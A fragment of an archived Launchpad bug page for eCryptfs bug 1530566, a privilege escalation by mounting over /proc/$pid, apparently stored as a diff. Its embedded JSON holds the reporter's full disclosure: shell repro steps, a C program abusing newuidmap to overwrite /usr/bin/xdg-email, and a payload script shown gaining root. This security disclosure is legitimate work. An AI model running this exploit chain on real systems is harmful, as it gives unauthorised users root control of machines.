+    <li><a class="menu-link-unlinkcve sprite modify remove" href="https://bugs.launchpad.net/ecryptfs/+bug/1530566/+unlinkcve">Remove CVE link</a></li>
+  </ul>
+</div>
+
+      
+
+      <div class="portlet vertical" id="portlet-subscription">
+  <div class="section">
+    <div id="current_user_subscription" class="False">
+      
+        <span>You are</span>
+        
+        <a class="menu-link-subscription sprite modify edit" href="/ecryptfs/+bug/1530566/+subscribe">
+           
+           
+           
+           not directly subscribed to this bug's notifications.
+        </a>
+      
+      
+    </div>
+    <div id="sub-unsub-spinner">Subscribing...</div>
+    <ul>
+      
+      <li><a class="menu-link-editsubscriptions sprite modify edit" href="https://bugs.launchpad.net/ecryptfs/+bug/1530566/+subscriptions" title="View and change your subscriptions to this bug">Edit bug mail</a></li>
+    </ul>
+  </div>
+  <script type="text/javascript">
+    LPJS.use('io-base', 'node',
+            'lp.bugs.bugtask_index.portlets.subscription', function(Y) {
+        Y.on('domready', function() {
+            Y.lp.bugs.bugtask_index.portlets.subscription.initialize();
+        });
+    });
+  </script>
+</div>
+
+      <div class="portlet vertical" id="portlet-subscribers">
+  <h2>Other bug subscribers</h2>
+  <div>
+    <div><a class="menu-link-addsubscriber sprite add" href="https://bugs.launchpad.net/ecryptfs/+bug/1530566/+addsubscriber" title="Launchpad will email that person whenever this bugs changes">Subscribe someone else</a></div>
+  </div>
+  <div id="other-bug-subscribers"></div>
+</div>
+
+      
+
+      
+
+      
+  <div class="portlet" id="portlet-patches">
+    <h2>Patches</h2>
+    <ul>
+      <li class="download-attachment">
+        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ecryptfs/+bug/1530566/+attachment/4545979/+files/private-mount-dest-fs-type-whitelist.patch">private-mount-dest-fs-type-whitelist.patch</a>
+        <small>
+          (<a href="/ecryptfs/+bug/1530566/+attachment/4545979">edit</a>)
+        </small>
+      </li>
+    </ul>
+    <ul>
+      <li>
+        <a class="sprite add" href="/ecryptfs/+bug/1530566/+addcomment?field.patch=on">Add patch</a>
+      </li>
+    </ul>
+  </div>
+  
+
+
+      
+
+    
+          </div><!-- yui-b side -->
+        
+      </div><!-- yui-t4 -->
+
+      
+  <div id="footer" class="footer">
+    <div class="lp-arcana">
+        <div class="lp-branding">
+          <a href="https://launchpad.net/"><img src="/@@/launchpad-logo-and-name-hierarchy.png" alt="Launchpad" /></a>
+          &nbsp;&bull;&nbsp;
+          <a href="https://launchpad.net/+tour">Take the tour</a>
+          &nbsp;&bull;&nbsp;
+          <a href="https://help.launchpad.net/">Read the guide</a>
+          &nbsp;
+          <form id="globalsearch" method="get" accept-charset="UTF-8" action="https://launchpad.net/+search">
+            <input type="search" id="search-text" name="field.text" />
+            <input type="image" src="/@@/search" style="vertical-align:5%" alt="Search Launchpad" />
+          </form>
+        </div>
+        
+  
+
+    </div>
+
+    <div class="colophon">
+      &copy; 2004-2021
+      <a href="http://canonical.com/">Canonical&nbsp;Ltd.</a>
+      &nbsp;&bull;&nbsp;
+      <a href="https://launchpad.net/legal">Terms of use</a>
+      &nbsp;&bull;&nbsp;
+      <a href="https://www.ubuntu.com/legal/dataprivacy">Data privacy</a>
+      &nbsp;&bull;&nbsp;
+      <a href="/feedback">Contact Launchpad Support</a>
+      
+      &nbsp;&bull;&nbsp;
+      <a href="http://blog.launchpad.net/">Blog</a>
+      
+	&nbsp;&bull;&nbsp;
+	<a href="https://canonical.com/careers">Careers</a>
+      
+      &nbsp;&bull;&nbsp;
+      <a href="https://twitter.com/launchpadstatus">System status</a>
+      <span id="lp-version">
+      &nbsp;&bull;&nbsp;
+        r0d8de2b
+        
+        
+        (<a href="https://dev.launchpad.net/">Get the code!</a>)
+      </span>
+    </div>
+  </div>
+
+    </div><!-- yui-d0-->
+
+    
+  
+  
+  <script id="json-cache-script">LP.cache = {"initial_comment_batch_offset": 41, "first visible_recent_comment": -30, "related_features": {}, "subscribers_portlet_url_data": {"web_link": "https://bugs.launchpad.net/bugs/1530566", "self_link": "https://bugs.launchpad.net/api/devel/bugs/1530566"}, "bug": {"self_link": "https://bugs.launchpad.net/api/devel/bugs/1530566", "web_link": "https://bugs.launchpad.net/bugs/1530566", "resource_type_link": "https://bugs.launchpad.net/api/devel/#bug", "id": 1530566, "private": false, "information_type": "Public Security", "name": null, "title": "privilege escalation by mounting over /proc/$pid", "description": "An unprivileged user can mount an ecryptfs over /proc/$pid because according to stat(), it is a normal directory and owned by the user. However, the user is not actually permitted to create arbitrary directory entries in /proc/$pid, and ecryptfs' behavior might be enabling privilege escalation attacks with the help of other programs that use procfs.\n\nRepro:\n\nOn Ubuntu 15.10 Desktop, as root, install ecryptfs-utils and uidmap. Then, as user, do this:\n\n==============================================================================\nuser2@user-VirtualBox:~$ ecryptfs-setup-private\nEnter your login passphrase [user2]:\nEnter your mount passphrase [leave blank to generate one]:\nEnter your mount passphrase (again):\n\n************************************************************************\nYOU SHOULD RECORD YOUR MOUNT PASSPHRASE AND STORE IT IN A SAFE LOCATION.\n\u00a0\u00a0ecryptfs-unwrap-passphrase ~/.ecryptfs/wrapped-passphrase\nTHIS WILL BE REQUIRED IF YOU NEED TO RECOVER YOUR DATA AT A LATER TIME.\n************************************************************************\n\nDone configuring.\n\nTesting mount/write/umount/read...\nInserted auth tok with sig [85448916757c54dd] into the user session keyring\nInserted auth tok with sig [6105ef336170239a] into the user session keyring\nInserted auth tok with sig [85448916757c54dd] into the user session keyring\nInserted auth tok with sig [6105ef336170239a] into the user session keyring\nTesting succeeded.\n\nLogout, and log back in to begin using your encrypted directory.\n\nuser2@user-VirtualBox:~$ echo \"/home/user2/.Private /proc/$$ ecryptfs none 0 0\" \u003e .ecryptfs/evil.conf\nuser2@user-VirtualBox:~$ cp .ecryptfs/Private.sig .ecryptfs/evil.sig\nuser2@user-VirtualBox:~$ sed 's|/sbin/mount\\.ecryptfs_private|\\0 evil|' \u003c /usr/bin/ecryptfs-mount-private \u003e /tmp/foo\nuser2@user-VirtualBox:~$ chmod +x /tmp/foo\nuser2@user-VirtualBox:~$ /tmp/foo\nEnter your login passphrase:\nInserted auth tok with sig [85448916757c54dd] into the user session keyring\nuser2@user-VirtualBox:~$ ln -s /etc/hostname /proc/$$/uid_map\nuser2@user-VirtualBox:~$ newuidmap $$ 0 1001 1\nuser2@user-VirtualBox:~$ cat /etc/hostname\n0 1001 1\nualBox\n==============================================================================\n\nAs you can see, the start of /etc/hostname was clobbered with attacker-controlled content.\n\nNow the interesting part comes: We can only write lines with numbers, and only starting at the start of files, so how does this yield code exec? :D\nBash has an interesting behavior when invoking executable files: If the kernel doesn't recognize a file, bash will try to run it as a shellscript. And then, if that shellscript contains a spew of invalid commands, bash will just keep going (and spit out error messages) until it hits a valid command. When it sees a single line with a valid command, it'll run it, no matter what comes after that. And therefore, this works (after the same preparation as above):\n\n$ grep -bo '/tmp/.*' /usr/bin/xdg-email\n4721:/tmp/logo.png \\\n\nWe need 4721 bytes padding.\n\"0 1001 1\\n\" is 9 bytes long, we use it until the remaining padding is a multiple of 10. Every use increments the last digit by one, so we use it 9 times. The remaining padding is 4721-9*9=4640 bytes, which we can fill using 464 times \"10 1001 1\\n\", which is 10 bytes long.\n\n$ rm /proc/$$/uid_map # if it still exists from the last part\n$ ln -s /usr/bin/xdg-email /proc/2468/uid_map\n$ cat attack.c\n#include \u003cerr.h\u003e\n#include \u003cunistd.h\u003e\n#include \u003cstring.h\u003e\n\nint main(int argc, char **argv_in) {\n\u00a0\u00a0if (argc != 3)\n\u00a0\u00a0\u00a0\u00a0errx(1, \"bad invocation, want ./attack \u003cpid\u003e \u003cmyuid\u003e\");\n\u00a0\u00a0char *pid = argv_in[1];\n\u00a0\u00a0char *myuid = argv_in[2];\n\u00a0\u00a0if (strlen(myuid) != 4)\n\u00a0\u00a0\u00a0\u00a0errx(1, \"bad uid\");\n\u00a0\u00a0int pad10_count = 464;\n\u00a0\u00a0int pad9_count = 9;\n\u00a0\u00a0int total_count = pad10_count + pad9_count;\n\u00a0\u00a0char *argv[1 + 1 + 3 * total_count + 1];\n\u00a0\u00a0argv[0] = \"newuidmap\";\n\u00a0\u00a0argv[1] = pid;\n\u00a0\u00a0int j = 2;\n\u00a0\u00a0for (int i=0; i\u003cpad10_count; i++) {\n\u00a0\u00a0\u00a0\u00a0argv[j++] = \"10\";\n\u00a0\u00a0\u00a0\u00a0argv[j++] = \"1001\";\n\u00a0\u00a0\u00a0\u00a0argv[j++] = \"1\";\n\u00a0\u00a0}\n\u00a0\u00a0for (int i=0; i\u003cpad9_count; i++) {\n\u00a0\u00a0\u00a0\u00a0argv[j++] = \"1\";\n\u00a0\u00a0\u00a0\u00a0argv[j++] = \"1001\";\n\u00a0\u00a0\u00a0\u00a0argv[j++] = \"1\";\n\u00a0\u00a0}\n\u00a0\u00a0argv[j++] = NULL;\n\u00a0\u00a0execvp(\"newuidmap\", argv);\n\u00a0\u00a0err(1, \"execvp\");\n}\n$ gcc -o attack attack.c -Wall -std=gnu99\n$ ./attack $$ 1001\n$ echo -e '#!/bin/sh\\necho \"owned!\"\\nid\\nkill -9 $PPID' \u003e /tmp/logo.png\n$ chmod +x /tmp/logo.png\n\nAnd now as another user (or root):\n\nlBox:/etc# xdg-email\n/usr/bin/xdg-email: line 1: 10: command not found\n/usr/bin/xdg-email: line 2: 10: command not found\n[...]\n/usr/bin/xdg-email: line 472: 1: command not found\n/usr/bin/xdg-email: line 473: 1: command not found\nowned!\nuid=0(root) gid=0(root) groups=0(root)\nKilled\n\nOf course, this kind of modification doesn't work for most executables, but it does work for some.\n\nAnother way to exploit this without newuidmap might be to confuse polkit about the identity of a connecting process - _polkit_unix_process_get_owner() contains code to determine the ruid of a process by reading its /proc/$pid/status file. I didn't investigate that much though, so I'm not sure whether that codepath is actually used anywhere.\n\nI'm not sure about what a proper fix for this would look like - maybe just blacklist the dev_t of procfs when checking the result of stat()ing the mountpoint and also require access(\".\", R_OK|W_OK|X_OK) to be successful? Or you could do what FUSE does and prevent anyone except for the user from accessing the mountpoint.", "owner_link": "https://bugs.launchpad.net/api/devel/~jann-e", "bug_tasks_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1530566/bug_tasks", "duplicate_of_link": null, "date_created": "2016-01-02T19:17:08.503040+00:00", "activity_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1530566/activity", "subscriptions_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1530566/subscriptions", "date_last_updated": "2016-01-22T18:30:27.332384+00:00", "who_made_private_link": null, "date_made_private": null, "heat": 260, "bug_watches_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1530566/bug_watches", "cves_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1530566/cves", "duplicates_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1530566/duplicates", "attachments_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1530566/attachments", "security_related": true, "latest_patch_uploaded": "2016-01-08T01:45:42.753770+00:00", "tags": ["patch"], "date_last_message": "2016-01-22T18:30:21.808066+00:00", "number_of_duplicates": 0, "message_count": 11, "users_affected_count": 1, "users_unaffected_count": 0, "users_affected_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1530566/users_affected", "users_unaffected_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1530566/users_unaffected", "users_affected_count_with_dupes": 1, "other_users_affected_count_with_dupes": 1, "users_affected_with_dupes_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1530566/users_affected_with_dupes", "messages_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1530566/messages", "linked_branches_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1530566/linked_branches", "linked_merge_proposals_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1530566/linked_merge_proposals", "http_etag": "\"11e245df7ebd969577cf57bb40f18820eb1d6831-6ff32f83a6d1b4e08a41ef6aa48aff8d9e990798\""}, "bugtask_data": {"1971776": {"milestone_widget_items": "[]", "status_widget_items": "[]", "delete_link": "https://bugs.launchpad.net/ecryptfs/+bug/1530566/+delete", "user_can_edit_status": true, "bugtask_path": "/ecryptfs/+bug/1530566", "row_id": "tasksummary1971776", "importance_value": "High", "importance_widget_items": "[]", "id": 1971776, "user_can_delete": false, "targetname": "eCryptfs", "user_can_edit_importance": false, "assignee_vocabulary_filters": [], "bug_title": "privilege escalation by mounting over /proc/$pid", "assignee_value": "tyhicks", "hide_assignee_team_selection": true, "user_can_edit_assignee": false, "form_row_id": "task1971776", "target_is_product": true, "assignee_is_team": false, "status_value": "Fix Committed", "user_can_unassign": false, "milestone_value": null, "assignee_vocabulary": "AllUserTeamsParticipation", "user_can_edit_milestone": false, "prefix": "ecryptfs"}, "1976262": {"milestone_widget_items": "[]", "status_widget_items": "[]", "delete_link": "https://bugs.launchpad.net/ubuntu/+source/ecryptfs-utils/+bug/1530566/+delete", "user_can_edit_status": true, "bugtask_path": "/ubuntu/+source/ecryptfs-utils/+bug/1530566", "row_id": "tasksummary1976262", "importance_value": "High", "importance_widget_items": "[]", "id": 1976262, "user_can_delete": false, "targetname": "ecryptfs-utils (Ubuntu)", "user_can_edit_importance": false, "assignee_vocabulary_filters": [], "bug_title": "privilege escalation by mounting over /proc/$pid", "assignee_value": "kirkland", "hide_assignee_team_selection": true, "user_can_edit_assignee": false, "form_row_id": "task1976262", "target_is_product": false, "assignee_is_team": false, "status_value": "Fix Released", "user_can_unassign": false, "milestone_value": null, "assignee_vocabulary": "AllUserTeamsParticipation", "user_can_edit_milestone": false, "prefix": "ubuntu_ecryptfs-utils"}, "1976263": {"milestone_widget_items": "[]", "status_widget_items": "[]", "delete_link": "https://bugs.launchpad.net/ubuntu/vivid/+source/ecryptfs-utils/+bug/1530566/+delete", "user_can_edit_status": true, "bugtask_path": "/ubuntu/vivid/+source/ecryptfs-utils/+bug/1530566", "row_id": "tasksummary1976263", "importance_value": "High", "importance_widget_items": "[]", "id": 1976263, "user_can_delete": false, "targetname": "ecryptfs-utils (Ubuntu Vivid)", "user_can_edit_importance": false, "assignee_vocabulary_filters": [], "bug_title": "privilege escalation by mounting over /proc/$pid", "assignee_value": "tyhicks", "hide_assignee_team_selection": true, "user_can_edit_assignee": false, "form_row_id": "task1976263", "target_is_product": false, "assignee_is_team": false, "status_value": "Fix Released", "user_can_unassign": false, "milestone_value": null, "assignee_vocabulary": "AllUserTeamsParticipation", "user_can_edit_milestone": false, "prefix": "ubuntu_vivid_ecryptfs-utils"}, "1976264": {"milestone_widget_items": "[]", "status_widget_items": "[]", "delete_link": "https://bugs.launchpad.net/ubuntu/trusty/+source/ecryptfs-utils/+bug/1530566/+delete", "user_can_edit_status": true, "bugtask_path": "/ubuntu/trusty/+source/ecryptfs-utils/+bug/1530566", "row_id": "tasksummary1976264", "importance_value": "High", "importance_widget_items": "[]", "id": 1976264, "user_can_delete": false, "targetname": "ecryptfs-utils (Ubuntu Trusty)", "user_can_edit_importance": false, "assignee_vocabulary_filters": [], "bug_title": "privilege escalation by mounting over /proc/$pid", "assignee_value": "tyhicks", "hide_assignee_team_selection": true, "user_can_edit_assignee": false, "form_row_id": "task1976264", "target_is_product": false, "assignee_is_team": false, "status_value": "Fix Released", "user_can_unassign": false, "milestone_value": null, "assignee_vocabulary": "AllUserTeamsParticipation", "user_can_edit_milestone": false, "prefix": "ubuntu_trusty_ecryptfs-utils"}, "1976265": {"milestone_widget_items": "[]", "status_widget_items": "[]", "delete_link": "https://bugs.launchpad.net/ubuntu/xenial/+source/ecryptfs-utils/+bug/1530566/+delete", "user_can_edit_status": true, "bugtask_path": "/ubuntu/xenial/+source/ecryptfs-utils/+bug/1530566", "row_id": "tasksummary1976265", "importance_value": "High", "importance_widget_items": "[]", "id": 1976265, "user_can_delete": false, "targetname": "ecryptfs-utils (Ubuntu Xenial)", "user_can_edit_importance": false, "assignee_vocabulary_filters": [], "bug_title": "privilege escalation by mounting over /proc/$pid", "assignee_value": "kirkland", "hide_assignee_team_selection": true, "user_can_edit_assignee": false, "form_row_id": "task1976265", "target_is_product": false, "assignee_is_team": false, "status_value": "Fix Released", "user_can_unassign": false, "milestone_value": null, "assignee_vocabulary": "AllUserTeamsParticipation", "user_can_edit_milestone": false, "prefix": "ubuntu_xenial_ecryptfs-utils"}, "1976266": {"milestone_widget_items": "[]", "status_widget_items": "[]", "delete_link": "https://bugs.launchpad.net/ubuntu/precise/+source/ecryptfs-utils/+bug/1530566/+delete", "user_can_edit_status": true, "bugtask_path": "/ubuntu/precise/+source/ecryptfs-utils/+bug/1530566", "row_id": "tasksummary1976266", "importance_value": "High", "importance_widget_items": "[]", "id": 1976266, "user_can_delete": false, "targetname": "ecryptfs-utils (Ubuntu Precise)", "user_can_edit_importance": false, "assignee_vocabulary_filters": [], "bug_title": "privilege escalation by mounting over /proc/$pid", "assignee_value": "tyhicks", "hide_assignee_team_selection": true, "user_can_edit_assignee": false, "form_row_id": "task1976266", "target_is_product": false, "assignee_is_team": false, "status_value": "Fix Released", "user_can_unassign": false, "milestone_value": null, "assignee_vocabulary": "AllUserTeamsParticipation", "user_can_edit_milestone": false, "prefix": "ubuntu_precise_ecryptfs-utils"}, "1976267": {"milestone_widget_items": "[]", "status_widget_items": "[]", "delete_link": "https://bugs.launchpad.net/ubuntu/wily/+source/ecryptfs-utils/+bug/1530566/+delete", "user_can_edit_status": true, "bugtask_path": "/ubuntu/wily/+source/ecryptfs-utils/+bug/1530566", "row_id": "tasksummary1976267", "importance_value": "High", "importance_widget_items": "[]", "id": 1976267, "user_can_delete": false, "targetname": "ecryptfs-utils (Ubuntu Wily)", "user_can_edit_importance": false, "assignee_vocabulary_filters": [], "bug_title": "privilege escalation by mounting over /proc/$pid", "assignee_value": "tyhicks", "hide_assignee_team_selection": true, "user_can_edit_assignee": false, "form_row_id": "task1976267", "target_is_product": false, "assignee_is_team": false, "status_value": "Fix Released", "user_can_unassign": false, "milestone_value": null, "assignee_vocabulary": "AllUserTeamsParticipation", "user_can_edit_milestone": false, "prefix": "ubuntu_wily_ecryptfs-utils"}}, "bug_is_private": false, "context": {"self_link": "https://bugs.launchpad.net/api/devel/ecryptfs/+bug/1530566", "web_link": "https://bugs.launchpad.net/ecryptfs/+bug/1530566", "resource_type_link": "https://bugs.launchpad.net/api/devel/#bug_task", "bug_link": "https://bugs.launchpad.net/api/devel/bugs/1530566", "milestone_link": null, "status": "Fix Committed", "importance": "High", "assignee_link": "https://bugs.launchpad.net/api/devel/~tyhicks", "bug_target_display_name": "eCryptfs", "bug_target_name": "ecryptfs", "bug_watch_link": null, "date_assigned": "2016-01-21T01:22:01.732243+00:00", "date_created": "2016-01-02T19:17:08.503040+00:00", "date_confirmed": "2016-01-21T01:22:07.562324+00:00", "date_incomplete": null, "date_in_progress": "2016-01-21T01:22:07.562324+00:00", "date_closed": null, "date_left_new": "2016-01-21T01:22:07.562324+00:00", "date_triaged": "2016-01-21T01:22:07.562324+00:00", "date_fix_committed": "2016-01-21T01:22:07.562324+00:00", "date_fix_released": null, "date_left_closed": null, "owner_link": "https://bugs.launchpad.net/api/devel/~jann-e", "target_link": "https://bugs.launchpad.net/api/devel/ecryptfs", "title": "Bug #1530566 in eCryptfs: \"privilege escalation by mounting over /proc/$pid\"", "related_tasks_collection_link": "https://bugs.launchpad.net/api/devel/ecryptfs/+bug/1530566/related_tasks", "is_complete": false, "http_etag": "\"f09cff28b46aadc20878fd638db9d575b87780f8-b78d9a773801a6f30f0e7c948d22c3bffded56ce\""}, "information_type_data": {"PUBLIC": {"value": "PUBLIC", "is_private": false, "order": 0, "name": "Public", "description": "Everyone can see this information.\n", "description_css_class": "choice-description"}, "PRIVATESECURITY": {"value": "PRIVATESECURITY", "is_private": true, "order": 2, "name": "Private Security", "description": "Only the security group can see this information.\n ", "description_css_class": "choice-description"}, "USERDATA": {"value": "USERDATA", "is_private": true, "order": 3, "name": "Private", "description": "Only shared with users permitted to see private user information.\n", "description_css_class": "choice-description"}, "PUBLICSECURITY": {"value": "PUBLICSECURITY", "is_private": false, "order": 1, "name": "Public Security", "description": "Everyone can see this security related information.\n", "description_css_class": "choice-description"}}, "total_comments_and_activity": 56};</script>
+
+    
+  
+
+    
+  </body>
+
+
+  <!--
+    Facet name: bugs
+    Page type: main_side
+    Has global search: True
+    Has application tabs: True
+    Has side portlets: True
+
+    At least 82 queries/external actions issued in 1.90 seconds
+
+    Features: {'bugs.nominations.bug_supervisors_can_target': 'on', 'hard_timeout': '9000', 'visible_render_time': None, 'bugs.affected_count_includes_dupes.disabled': None, 'app.mainsite_only.canonical_url': None, 'app.maintenance_message': None, 'js.yui_version': None, 'disclosure.dsp_picker.enabled': 'on', 'profiling.enabled': None, 'baselayout.careers_link.disabled': None}
+
+    r0d8de2b
+
+    -->
+
+</html>
+
